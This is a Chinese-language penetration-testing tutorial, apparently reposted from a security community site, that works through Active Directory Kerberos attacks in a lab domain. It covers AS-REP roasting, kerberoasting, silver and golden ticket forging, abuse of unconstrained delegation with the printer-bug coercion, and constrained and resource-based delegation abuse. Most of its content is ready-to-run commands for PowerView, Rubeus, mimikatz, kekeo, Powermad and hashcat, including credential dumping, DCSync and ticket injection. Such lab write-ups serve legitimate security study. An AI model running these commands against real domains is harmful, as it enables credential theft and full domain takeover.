> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10541)

> 先知社区，先知安全技术社区

### Rosting AS-REP

使用这个攻击方法需要域控开启 “Do not require Kerberos preauthenticaton”，但是这个默认是关闭的。

在 AS-REQ 阶段，也就是 kerberos 的第一阶段会要求 hash 加密的时间戳，如果 KDC 使用 hash 解密的时间戳不匹配或者无法解密 kerberos 验证就会失败。

但是如果启用 “Do not require Kerberos preauthenticaton”，就不需要进行验证，使用任意存在的用户名向 KDC 发送请求，KDC 就会返回对应的 hash 加密的数据给我们，随后就可以进行爆破。

开启不需要预验证

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121814-b9dc82de-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121814-b9dc82de-491b-1.png)

使用 powerview.ps1 查询开启不需要预验证的账号

```
powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-DomainUser -PreauthNotRequired}"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-b9eef75c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-b9eef75c-491b-1.png)

利用 ASREPRoast.ps1 获取 hash

[https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

```
powershell.exe -exec bypass -Command "& {Import-Module .\ASREPRoast.ps1;Get-ASREPHash -UserName sc -Domain alanlitl.com}"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba007d10-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba007d10-491b-1.png)

利用 Rubeus

```
Rubeus.exe asreproast

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba1362f4-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba1362f4-491b-1.png)

只保存 hash，使用 hashcat 进行爆破，在后添加 $23

```
hashcat.exe -m 18200 sc_hash.txt password.txt

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba22fc78-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba22fc78-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba340d60-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba340d60-491b-1.png)

横向（TGS-REP）
-----------

### kerberoasting 攻击

[https://www.cnblogs.com/zpchcbd/p/11707776.html](https://www.cnblogs.com/zpchcbd/p/11707776.html)

#### SPN

##### SPN 作用

服务主体名称（SPN）是服务实列（如 HTTP，MySQL）的唯一标识

1.  Kerberos 身份验证就是使用 SPN 将服务实列与服务登录账户相关联。
2.  SPN 始终包含运行服务的主机名称，因此服务实列可以为其主机的每个名称或者别名注册 SPN。
    
3.  在整个林或者域䣌计算机上安装多个服务，每个服务都必须有自己的 SPN，如果客户端使用多个名称进行身份验证，那么服务也可以有多个 SPN。
    

##### SPN 分类

1.  注册在本地机器（Computers）下，当服务权限为 Local System 或者 Network Service 时，SPN 在 Computers 下。
2.  注册在域用户（User）下，当一个服务权限为与用户时，则注册在 User 下。

**注册问题**：在 windows 域里面，默认普通本地机器账户可以注册 SPN，但是普通域账户不能注册 SPN，当一个服务以 Local System account 启动时，kerberos 就能成功，但是以域用户启动时就不能成功

**解决**：在域控中将启动账户赋予`read servicePrincipalName 和 Write serverPrincipalName`权限，或者手动注册 SPN（`setspn -S MySQL/web-sc.de1ay.com:3307/MySQL web`）。

```
set -S http/<computername>.<domainname> <domainuseraccount>

```

##### 查看 SPN

```
当前域
setspn -q */*
指定域
setspn -T de1ay.com -q */*
删除SPN
setspn -D MySQL/web-sc.de1ay.com:3307/MySQL
创建用户SPN，不是computer那种
setspn -U xxx


```

扫描 SPN

工具：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

```
查询用户注册的SPN
Import-Module .\GetUserSPNs.ps1
cscript .\GetUserSPNs.vbs


```

工具：[https://github.com/PowerShellMafia/PowerSploit/](https://github.com/PowerShellMafia/PowerSploit/)

根据不同用户的 objectsid 返回，结果更加详细。

```
Import-Module .\PowerView.ps1
Get-NetUser -SPN


```

#### 利用 SPN 进行 kerberoasting

原理：TGS-REP 的数据包中，enc-part 使用的是服务的 hash 加密，由于域内任何用户都可以向域内任何服务请求 TGS，知道相关 SPN 后，可以使用 SPN 申请 TGS ticket，如果票据使用 RC4 加密，则可以通过爆破方式获取对应服务用户的密码。

**利用过程**

找到高权限账户 SPN

由于本地没有啥 SPN，先注册一个 SPN

登录一个有注册 SPN 权限的账户

```
setspn -U -A MySQL/web-sc.de1ay.com web

```

-U 指定用户账户，-C 指定计算机账户，增加、删除 SPN 的时候最好指定

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba42b914-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba42b914-491b-1.png)

```
setspn -q */*

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba4f438c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba4f438c-491b-1.png)

删除 SPN `setspn -U -D MySQL/web-sc.de1ay.com web`

如果无法修改 SPN 可以在域控`adsiedit.msc`中对应用户的 SELE 属性中开启读取、写入 servicePrincipalName 权限。

使用 GetUserSPN

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba5f7ba8-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba5f7ba8-491b-1.png)

使用 powerview

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba76c560-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121815-ba76c560-491b-1.png)

申请票据

```
powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/web-sc.de1ay.com"

cmd
powershell.exe -exec bypass -Command "& {$SPNName = 'MySQL/web-sc.de1ay.com'; Add-Type -AssemblyNAme System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName }"
一样的两句

mimikatz
kerberos::ask /target:SPNxxx


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-ba88495c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-ba88495c-491b-1.png)

**使用 mimikatz 申请票据**

```
kerberos::ask /target:MySQL/web-sc.de1ay.com:3307/MySQL

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-ba9d1080-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-ba9d1080-491b-1.png)

**使用 Rubeus**.exe，可以直接获取 hash，然后使用 hashcat 爆破

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bab03ff2-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bab03ff2-491b-1.png)

**申请 RC4 加密票据**

使用`System.IdentityModel.Tokens.KerberosRequestorSecurityToken`申请的票据可能会使用 RC4 加密，但实际这受到`msDS-SupportedEncryptionTypes`域对象属性影响，`msDS-SupportedEncryptionTypes`（ [微软文档](https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-adts/4f1f447a-4f35-49b1-a129-d76ea280a4c1)）字段的值决定了 Kerberoast 流程中返回的服务票证的加密级别。同时加密方式也收到本地组策略控制，如果在本地组策略中勾选 RC4 加密，那么不管域控中用户的`msDS-SupportedEncryptionTypes`字段如何设置都将为 RC4 加密。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bac4ed94-491b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bac4ed94-491b-1.jpg)[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-badd7ca6-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-badd7ca6-491b-1.png)

**服务**的`msDS-SupportedEncryptionTypes`字段为 **0x12**，本地组策略为 **RC4**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-baeae6ca-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-baeae6ca-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bafb3b10-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bafb3b10-491b-1.png)

加密方式依然为 RC4

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bb0cde10-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121816-bb0cde10-491b-1.png)

本地组策略修改为**未设置**后，申请的票据加密方式为 aes256

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb21eb7a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb21eb7a-491b-1.png)

cmd 下 klist 可以看见票据已经得到了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb38c57a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb38c57a-491b-1.png)

1.  **导出票据**

```
mimikatz::list /export

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb4b182e-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb4b182e-491b-1.png)

1.  **获取 hash**
    
2.  1.  **使用** kirbi2john.py 获取票据中的 hash
3.  1.  1.  [![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb697878-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb697878-491b-1.png)

1.  **破解 hash**
    
2.  1.  **利用** tgsrepcrack.py，这个脚本可以直接破解票据 kirbi 而不需要转换为 hash
3.  1.  1.  [![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb80bf92-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb80bf92-491b-1.png)
4.  1.  使用 hashcat：`hashcat.exe -m 13100 hash.txt password.txt --show`
5.  1.  1.  [![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb8d124c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb8d124c-491b-1.png)

#### 服务票据重写（使用脚本出现一点问题，没有复现成功）

```
改变用户
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
改变组
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
使用mimikatz注入票据
kerberos::ptt PENTESTLAB.kirbi


```

### 白银票据

不同于黄金票据，通过使用服务 hash 伪造服务票据，只能访问对应服务。

我在 windows server 2012 R2 复现失败，换成 2008 成功了

#### 利用条件

域名

域 SID

目标服务 FQDN

可利用的服务

服务账号的 NTLM Hash

伪造用户名

#### 利用过程

1.  先获取 hash

获取的是服务的 hash，伪造 cifs 或者 ldap 之类的一般是主机的 hash

```
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb9a82c4-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bb9a82c4-491b-1.png)

1.  伪造票据

伪造 cifs 和 ldap 需要主机的 hash

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bba9e3cc-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121817-bba9e3cc-491b-1.png)

通过 mimikatz 伪造

```
kerberos::golden /domain:alanlitl.com /sid:S-1-5-21-3389487055-3676497411-292983562 /target:dc.alanlitl.com /rc4:16ec75ab12108ae708f6d6a481f4ca4a /service:ldap /user:test /ptt


```

1.  获取权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbc2793c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbc2793c-491b-1.png)

委派
--

> [https://xz.aliyun.com/t/8690#toc-64](https://xz.aliyun.com/t/8690#toc-64)
> 
> [https://www.cnblogs.com/secxue/p/14965428.html](https://www.cnblogs.com/secxue/p/14965428.html)
> 
> [https://www.cnblogs.com/backlion/p/10537813.html](https://www.cnblogs.com/backlion/p/10537813.html)
> 
> [https://my.oschina.net/u/4196756/blog/4911101](https://my.oschina.net/u/4196756/blog/4911101)
> 
> [https://www.cnblogs.com/backlion/p/10537813.html](https://www.cnblogs.com/backlion/p/10537813.html)
> 
> [https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw](https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw)

委派指用户将权限委派给服务账号，让服务账号能以用户权限开展活动

服务账号是指如 MS SQL Server 等运行时的账户，这类账户不能用于登录。

委派主要分为三类：非约束委派 (Unconstrained delegation)、约束委派 Constrained delegation)、基于资源的约束委派 (Resource Based Constrained Delegation)

如果账户设置敏感账户，不能被委派就无法使用委派，administrator 默认就是敏感账户。

### 非约束委派

[https://my.oschina.net/u/4196756/blog/4911101](https://my.oschina.net/u/4196756/blog/4911101)

如果服务开启非约束委派，当用户访问服务时，服务会在 lsass 进程中保存 TGT，然后服务就能利用 TGT 以用户的身份去访问其它服务。

开启方式：在用户属性中的委派页面开启，配置了非约束委派的账户的 userAccountControl 属性有个 FLAG 位为 TRUSTED_FOR_DELEGATION。设置非约束委派需要 SeEnableDelegationPrivilege 特权，该特权通常仅授权给域管。

**实现方式**：用户向 KDC 发起请求获得 TGT，然后用户再次向 KDC 发起请求获取 TGT2，访问服务时将 TGT，TGT2，ST 一起发送给服务，服务在内存中储存 TGT2，并且使用这张 TGT2 向 KDC 发起请求。获取到 ST 后向另一个服务发起请求。

#### 收集设置了非约束委派的账号：

##### powerview.ps1

```
powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-NetUser -Unconstrained -Domain alanlitl.com | select name }"
但是我下载的脚本没有-Unconstrained参数，换一种
powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-NetUser  -Domain alanlitl.com | select name,useraccountcontrol}"


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbd58586-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbd58586-491b-1.png)

收集设置了非约束委派的机器账号：

```
powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-NetComputer  -Domain alanlitl.com | select dnshostname,useraccountcontrol}"


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbeb5e06-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbeb5e06-491b-1.png)

域控默认设置为非约束委派

##### ADfind.exe

非约束委派账号

```
AdFind.exe -b "DC=alanlitl,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbfcbdb8-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bbfcbdb8-491b-1.png)

非约束委派主机

```
AdFind.exe -b "DC=alanlitl,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc11bd44-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc11bd44-491b-1.png)

#### 非约束委派攻击

设 web 主机为非约束委派

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc203b44-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc203b44-491b-1.png)

清除票据

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc397456-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc397456-491b-1.png)

使用高权限用户访问 web 主机

```
net use \\web\c$

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc448e40-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121818-bc448e40-491b-1.png)

在 web 主机上导出票据

```
privilege::debug;sekurlsa::tickets /export

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc545a82-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc545a82-491b-1.png)

```
kerberos::ptt xxxxx.kirbi

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc68f3f2-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc68f3f2-491b-1.png)

#### 非约束委派 + Spooler 打印机服务

[https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

强制让 dc 域自己进行认证，从而获取 dc 票据。 Windows Print System Remote Protocol 是 MS-RPRN 中的一个老旧但是默认的方法，可以让域用户使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification (Ex) 方法强制运行 Spooler 服务的机器通过 Kerberos 或者 NTLM 验证攻击者的目标。

！在 windows server 2008 下 SpoolSampler 程序无法运行，换成 2012 后成功。

需要主机账户开启非约束委派

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc7c578a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc7c578a-491b-1.png)

使用 Rubeus 监听票据

```
Rubeus.exe monitor /interval:1 /filteruser:dc$
Rubeus.exe monitor /interval:1 /filteruser:dc$ > 1.txt 将监听到的内容输出到1.txt中方便复制


```

[https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)

需要自己编译为 exe 文件

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc8ee40e-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc8ee40e-491b-1.png)

使用 printerbug.py

[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)

```
python printerbug.py 域/用户名:密码@打印机服务ip 回连ip
python printerbug.py alanlitl.com/web:2313root!@10.10.10.10 10.10.10.11


```

监听到票据

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc9ea100-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bc9ea100-491b-1.png)

将获取的票据导入，

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcacf19c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcacf19c-491b-1.png)

然后直接使用 mimikatz 导出域控上的 hash

```
lsadump::dcsync /domain:alanlitl.com /all


```

如果无法使用 Rubeus 可以使用 mimikatz

使用 mimikatz 导出所有票据

```
privilege::debug
sekurlsa::tickets /export


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcc0280c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcc0280c-491b-1.png)

```
然后导入域控票据
kerberos::ptt xxx.kirbi
dump出域控中的hash
lsadump::dcsync /domain:alanlitl.com /all


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcd09692-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121819-bcd09692-491b-1.png)

制作黄金票据

```
kerberos::golden /user:administrator /sid:S-1-5-21-3209219484-2126840192-101349831 /krbtgt:2465ff0d094e9bb9cad789eda29643b6 /domain:alanlitl.com /ticket:gold.kirbi /ptt


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bce1246c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bce1246c-491b-1.png)

获取 dc 权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bcf63852-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bcf63852-491b-1.png)

### 约束委派

由于非约束委派的不安全性，开启非约束委派就相当于获取了访问它账户的所有用户权限。所以微软引入了更安全的约束委派。约束委派多了两个协议 S4U2Self 和 S4U2Proxy，服务只能获取用户的 ST 而不是 TGT，这样只能去访问对应的服务。开启约束委派的账户 userAccountControl 属性有个 TRUSTED_TO_AUTH_FOR_DELEGATION（开启使用任何身份认证才有），并且 msDS-AllowedToDelegateTo 属性还会显示能访问的 SPN。如果这两个属性没有被赋值，那么 KDC 不会将其获得的票据设置为可转发。如果获取的 ST 票据不能转发，那么 S4U2Proxy 就没有用了。

需要开启使用任何身份验证

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd093e0c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd093e0c-491b-1.png)

首先需要一个服务账号，通过注册 SPN 可以获得

```
setspn -U -A MySQL/web.alanlitl.com web

```

在约束委派中添加该服务即可

#### 约束委派的两个协议

[http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)

1.  S4U2Proxy

当用户使用 ST1（可转发）访问 service1 时，service1 可以使用 ST1（可转发）向 KDC 获取一个访问服务 B 的 ST2。

1.  S4U2Self

当用户以其他方式访问服务如 NTLM，服务就无法向 KDC 申请访问其他服务的 ST，所以 S4U2Self 就是为了解决这个的。服务向向 KDC 申请一个 “以任意用户访问自己” 的可转发 TGT，然后利用该协议申请一张 “任意用户访问自己” 的可转发 ST1 并设置为可转发（该过程 KDC 会检验 1.TGT 是否可转发 2. 服务是否配置约束委派 3. 服务是否请求可转发选项），然后就是配合 S4U2Proxy，利用 ST1 获取访问服务 B 的 ST2。

#### 收集设置了约束委派的账号

powerview.ps1

服务账号

需要添加 SPN 才能在属性中找到委派选项。

```
powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1; Get-DomainUser -TrustedToAuth -Domain alanlitl.com | select name}"


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd1ae878-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd1ae878-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd2a2388-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd2a2388-491b-1.png)

可以看剧 MySQL 服务被设置为委派对象

机器账号

```
powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1; Get-DomainComputer -TrustedToAuth -Domain alanlitl.com | select name}"


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd3a204e-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd3a204e-491b-1.png)

ADFind

```
主机
AdFind.exe -b "DC=alanlitl,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto

用户
AdFind.exe -b "DC=alanlitl,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegatet


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd49ec9a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd49ec9a-491b-1.png)

#### 约束委派攻击方式

查找设置约束委派的账户，和对应的 SPN

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd5a4996-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd5a4996-491b-1.png)

可以看到 web 用户可以获取域控 cifs 的 ST 票据。

利用 kekeo 获取票据

[https://github.com/gentilkiwi/kekeo/](https://github.com/gentilkiwi/kekeo/)

kekeo 的编译有点麻烦，并不能直接编译

**kekeo**

1.  请求 TGT

```
使用ntlm hash申请TGT
tgt::ask /user:web /domain:alanlitl.com /ntlm:xxxxxxxxxxxxx
使用明文 将/ntlm:xxxxx改为/password:xxxx


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd6a59bc-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121820-bd6a59bc-491b-1.png)

1.  请求 ST

```
tgs::s4u /tgt:1.kirbi /user:Administrator@alanlitl.com /service:cifs/dc.alanlitl.com


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bd801b94-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bd801b94-491b-1.png)

1.  使用 mimikatz 导入票据，就可以访问 dc 了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bd91684a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bd91684a-491b-1.png)

**Rubeus**

rubeus 在 cmd 中并不能很好显示，可以在 powershell 使用

1.  请求 TGT

```
.\Rubeus.exe asktgt /user:web /ntlm:810445cb03214d4b609bf0236836d093


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bda7052e-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bda7052e-491b-1.png)

1.  获取 ST

```
Rubeus.exe s4u /ticket:ticket_base64 /impersonateuser:administrator /domain:alanlitl.com /msdsspn:cifs/dc.alanlitl.com /dc:dc.alanlitl.com /ptt


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bdba389c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bdba389c-491b-1.png)

**主机账户的方式是一样的只是使用的 hash 是主机的 hash**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bdd07206-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bdd07206-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bde810f0-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-bde810f0-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-be0186c0-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121821-be0186c0-491b-1.png)

### 基于资源的约束委派

> 这是 windows 2012 R2 中新加入的功能，不需要域管配置委派权限，传统的约束委派是在域控上向服务 A 中添加服务 B 的 SPN，以达到让服务 A 通过委派访问服务 B，而基于资源的约束委派只需要在服务 B 上通过配置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性添加服务 A 的 SPN 允许服务 A 使用委派访问服务 B。

能利用的原因：

服务可以利用 S4U2Self 为任意用户请求自身的服务票据，并且在约束委派中提到过服务账号有个 UserAccountControl 属性它的值被设置为 TRUSTED_TO_AUTH_FOR_DELEGATION 时，利用 S4U2Self 获取的票据才能转发（才能被域控设置为可转发）。但是在基于资源的约束委派中，不可转发的票据仍然可以通过 S4U2Proxy 转发，并且获取一张访问对应服务的可转发票据。

利用过程：

在 sc 主机上创建一个主机账户 test（主要是得到有个有 SPN 的账户，而且用户名密码由我们设置），然后将设置 sc 的基于资源的约束委派为 test 主机（在 sc 上添加 test 的 SPN），然后利用 test 主机申请一张以域管身份访问自身的票据，利用基于资源的约束委派的条件获取一张访问 sc 的票据，由于该票据是以域管身份发起，所以是以域管权限访问，但是票据只用于 sc 账户，所以相当于提权。

综上所述，如果我们能够修改 msDS-AllowedToActOnBehalfOfOtherIdentity，就可以获得一张域管的票据。但是仅限于访问自己，相当于提权。

#### 利用条件

1.  拥有修改当前机器 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的账户。
2.  除此之外我们还需要一个具有 SPN 的账户（我们可以利用上面条件那个账户创建一个机器账户，机器账户会默认注册一些 SPN）

查看用户对当前机器用户是否具有权限（如果该机器是使用该用户加入的域，那么就有权限）

```
Import-Module .\PowerView.ps1
Get-DomainUser -Identity sc -Properties objectsid
Get-DomainObjectAcl -Identity test  | ?{$_.SecurityIdentifier -match "SID"}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be1801d4-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be1801d4-491b-1.png)

其中 ActiveDirectoryRights 属性控制是否可以修改账户属性，GenericAll、GenericWrite、WriteProperty、WriteDacl 等都是可以修改的。

**创建机器账户**

[https://gitee.com/RichChigga/Powermad/](https://gitee.com/RichChigga/Powermad/)

由于域控的 ms-DS-MachineAccountQuota 属性可以允许域账户（用户账户，服务账户，机器账户）在域里添加 10 个机器账户，所以可以直接添加机器账户，并且密码由我们自己设置。

创建账户

```
powershell.exe -exec bypass -Command "& {Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString "2313root!" -AsPlainText -Force)}"

```

查看机器账户

```
net group "domain computers" /domain

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be23832e-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be23832e-491b-1.png)

查看当前用户对该机器账户是否具有控制权限

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be34ab22-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be34ab22-491b-1.png)

#### 添加基于资源的约束委派

获取 test 机器账户的 SID

```
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity test -Properties objectsid


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be48cb84-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be48cb84-491b-1.png)

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3209219484-2126840192-101349831-1106)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Import-Module .\powerview.ps1
Get-DomainComputer sc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be5c01c2-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be5c01c2-491b-1.png)

使用 Active Directory Explorer

